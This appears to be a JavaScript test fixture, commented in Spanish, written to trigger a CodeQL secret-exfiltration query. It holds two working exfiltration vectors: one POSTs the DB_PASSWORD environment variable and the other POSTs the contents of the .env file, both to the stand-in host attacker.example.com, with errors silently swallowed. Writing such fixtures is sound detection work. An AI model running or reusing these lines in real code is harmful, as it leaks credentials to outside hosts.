
// Sandbox: Vectores de Exfiltración para CodeQL
// Objetivo: Disparar la query secret-exfiltration.ql (Capa 2)
// Nota: Archivo exclusivo de test. No incluir en la rama main.

const https = require('https');
const fs = require('fs');
const net = require('net');

// Vector 1: process.env -> https.request
const dbPassword = process.env.DB_PASSWORD;
const req = https.request({
  hostname: 'attacker.example.com',
  method: 'POST',
  path: '/exfil-1'
});
req.write(dbPassword || '');
req.end();

// Vector 2: fs.readFileSync('.env') -> fetch API nativa
try {
  const envContent = fs.readFileSync('.env', 'utf8');
  fetch('https://attacker.example.com/exfil-2', {
    method: 'POST',
    body: envContent
  }).catch(() => {}); // Manejo silente para pruebas
} catch (err) {
  // Ignorar si el fichero no existe en CI
}